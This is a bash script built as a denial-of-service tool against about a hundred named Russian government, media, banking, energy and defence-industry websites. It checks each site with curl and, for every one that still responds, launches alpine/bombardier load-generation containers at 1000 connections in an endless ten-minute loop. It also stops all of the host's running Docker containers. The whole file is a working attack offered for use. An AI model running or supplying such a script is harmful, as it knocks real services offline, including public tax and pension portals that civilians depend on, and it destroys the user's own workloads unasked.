#!/bin/bash

# FILE #1 PROPAGANDA AND KORPORATIONS

# Configuration of Bombardier
BOMBARDIER_TIMEOUT=10m #this is the time of bombardement
BOMBARDIER_CONNECTIONS=1000

declare -a sites=(
"http://shop-rt.com/"
"https://www.interfax.ru/"
"https://ria.ru/"
"https://gazeta.ru/"
"https://kp.ru/"
"https://riafan.ru/"
"https://pikabu.ru/"
"http://kommersant.ru/"
"http://mk.ru/"
"http://yaplakal.com/"
"http://rbc.ru/"
"http://bezformata.com/"
"https://lenta.ru/"
"https://www.rbc.ru/"
"https://www.rt.com/"
"http://kremlin.ru/"
"http://en.kremlin.ru/"
"https://smotrim.ru/"
"https://tass.ru/"
"https://tvzvezda.ru/"
"https://vsoloviev.ru/"
"https://www.1tv.ru/"
"https://www.vesti.ru/"
"https://online.sberbank.ru/"
"https://sberbank.ru/"
"https://zakupki.gov.ru/"
"https://www.gosuslugi.ru/"
"https://er.ru/"
"https://www.rzd.ru/"
"https://rzdlog.ru/"
"https://vgtrk.ru/"
"https://www.mos.ru/"
"http://government.ru/"
"https://mil.ru/"
"https://www.nalog.gov.ru/"
"https://customs.gov.ru/"
"https://pfr.gov.ru/"
"https://rkn.gov.ru/"
"https://www.gazprombank.ru/"
"https://www.vtb.ru/"
"https://www.gazprom.ru/"
"https://lukoil.ru"
"https://magnit.ru/"
"https://www.nornickel.com/"
"https://www.surgutneftegas.ru/"
"https://www.tatneft.ru/"
"https://www.evraz.com/"
"https://nlmk.com/"
"https://www.sibur.ru/"
"https://www.severstal.com/"
"https://www.metalloinvest.com/"
"https://nangs.org/"
"https://rmk-group.ru/"
"https://www.tmk-group.ru/"
"https://ya.ru/"
"https://www.polymetalinternational.com/"
"https://www.uralkali.com/"
"https://www.eurosib.ru/"
"https://ugmk.ua/"
"https://omk.ru/"
"https://rusvesna.su"
"https://www.novorosinform.org"
"https://xn--90aivcdt6dxbc.xn--p1ai/"
"https://mil.press/"
"https://azgaz.ru/"
"https://kalashnikovgroup.ru/"
"https://www.uacrussia.ru/"
"http://www.mirconnect.ru/"
"http://admship.ru/"
"https://mvd.gov.ru"
"https://www.fsb.ru"
"https://www.ktrv.ru"
"https://www.uralvagonzavod.ru"
"https://www.sevmash.ru/"
"https://www.rhc.aero/"
"https://stroi.gov.ru/"
"https://stroi.gov/"
"https://www.uecrus.com/rus/"
"https://cloud.rkn.gov.ru/"
"https://www.5-tv.ru/"
"https://rg.ru/"
"https://ac.gov.ru"
"https://duma.gov.ru"
"https://crimea.gov.ru"
"https://council.gov.ru"
"https://chechnya.gov.ru"
"https://epp.genproc.gov.ru"
"https://edu.gov.ru"
"http://www.sobyanin.ru"
"https://www.miranda-media.ru/"
"https://simferopol.miranda-media.ru/"
"https://sevastopol.miranda-media.ru/"
"https://novoozernoye.miranda-media.ru/"
"https://feodosia.miranda-media.ru/"
"https://yalta.miranda-media.ru/"
"https://alupka.miranda-media.ru/"
"https://inkerman.miranda-media.ru/"
"https://primorskij.miranda-media.ru/"
"https://oliva.miranda-media.ru/"
"https://foros.miranda-media.ru/"
"https://chernomorskoe.miranda-media.ru/"
"https://kirovskoe.miranda-media.ru/"
"https://garant.ru"
"https://gossluzhba.gov.ru"
)

while :
do
  echo "Stop all containers"
  docker stop $(docker ps -aq)
  echo "Docker containers stopped"

  echo "Run ddos for all sites"
  for site in "${sites[@]}"; do
  
    status_code=$(curl -m 2 -s -o /dev/null  -w "%{http_code}" "$site")
    status_code=$(expr "$status_code" + 0)
    # If status code is zero site is already blocked
  
    site_status="${site} status code ${status_code}"
    echo "$site_status"
  
    if (("$status_code" != 0 && "$status_code" <= 400)); then
      echo "Must be destroyed"
      docker run -ti -d --rm alpine/bombardier -c "$BOMBARDIER_CONNECTIONS" -d "$BOMBARDIER_TIMEOUT" -l "$site"
    fi
  
  done

  echo "DDoS is up and running..."

  #these are SECONDS and they must correspond to BOMBARDIER_TIMEOUT above...in this case it's 10minutes
  sleep 600

  echo "Restarting DDoS, checking which sites are still working"
done